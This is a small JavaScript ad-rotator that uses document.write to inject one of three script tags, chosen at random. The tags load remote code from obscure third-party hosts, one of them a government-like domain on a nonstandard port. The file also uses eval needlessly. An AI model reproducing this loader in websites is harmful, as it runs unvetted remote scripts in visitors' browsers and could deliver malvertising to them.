var randoms = {
	ads_codes: ['<script src="https://show.meituangov.cn:12443/ty/04F4DCD4-CB1B-1889-33-218A16146EE3.alpha"><'+'/script>','<script src="//js.handanxinkai.com/c.aspx?action=c&c1=7&c2=1206&c3=&c4=2&c5=AdCode_sjdb&c6=640x200&c7=1&c8=1&c9=&c10="><'+'/script>','<script id=\'mob\' type=\'text/javascript\' charset=\'utf-8\' src=\'https://k.wudejia.com/d.php?pid=3860\'><'+'/script>'],
	ads_weight: [10,10,10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();